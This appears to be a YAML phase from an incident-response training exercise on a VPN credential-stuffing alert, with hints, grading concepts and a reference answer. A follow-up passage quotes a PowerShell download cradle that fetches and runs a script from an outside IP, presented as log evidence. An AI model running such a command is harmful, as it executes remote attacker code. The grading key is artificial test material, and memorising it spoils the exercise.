phases:
- id: vpn_authentication_anomaly_alert
  phase_type: triage
  title: Phase 1 — VPN Authentication Anomaly Alert
  situation: |
    At 02:41 UTC, your SIEM (Splunk) fires a high-severity correlation
    rule 'VPN Credential Stuffing Burst' after detecting >500 failed
    logins to GlobalProtect from Tor exit nodes within 30 minutes. The
    raw log shows attempts against 412 unique AD usernames. Three accounts
    showed successful authentication at 03:04 UTC. You need to determine
    the scope of the breach immediately.
  prompt: What is your first action?
  guidance:
    what: Establish what fired on vpn-gw01.corp.acme.local, which accounts are involved, and how urgent the signal is.
    action: What is your first action?
    why: Every later decision depends on an accurate picture of vpn-gw01.corp.acme.local and the accounts involved.
  hint: 'Start with the alert itself: which asset, account, and time window are actually in scope? Focus: Phase 1 — VPN Authentication Anomaly Alert. Asset in scope: vpn-gw01.corp.acme.local.'
  hints:
  - |-
    This is a defensive containment action but is premature without
    knowing the attack scope.
  - |-
    Shutting down the VPN gateway is an extreme overreaction at this
    stage.
  - |-
    A generic blast without scoping the incident wastes analyst time
    and creates unnecessary panic.
  ideal_concepts:
  - full globalprotect
  - globalprotect authentication
  - authentication logs
  - logs splunk
  - splunk filter
  - filter successful
  - successful logins
  - logins tor
  reference_answer: |-
    Pull full GlobalProtect authentication logs from Splunk for
    02:00–04:00 UTC, filter for successful logins from Tor/non-US
    IPs, and cross-reference with AD group memberships to identify
    compromised accounts and their privilege levels.

    Why: Immediately identifying which accounts were compromised and
    their privilege scope is the most critical first step. Service
    accounts with domain admin rights pose the greatest risk.
    Cross-referencing with AD groups tells you whether any domain
    admin or backup admin accounts were taken over.
  followup_good: |
    Your log analysis reveals that the svc-backup account (domain admin)
    logged into DC-01.corp.acme.local (10.10.1.10) via RDP at 03:11 UTC.
    Event ID 4624 (Logon) and 4648 (Explicit Credentials) are present.
    Sysmon on DC-01 shows process creation: powershell.exe -ep bypass -c
    "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.99/
    Invoke-CradleKitten.ps1')". The j.hernandez account accessed the HR
    file server SMB share \\10.10.20.44\HR_PII and listed directories.
    The m.okafor account connected to the financials SharePoint site via
    HTTPS. DLP shows 2.3 GB uploaded to r2-backup-cdn.xyz. What do you do?
  followup_weak: |
    Immediately identifying which accounts were compromised and
    their privilege scope is the most critical first step.

    Your log analysis reveals that the svc-backup account (domain admin)
    logged into DC-01.corp.acme.local (10.10.1.10) via RDP at 03:11 UTC.
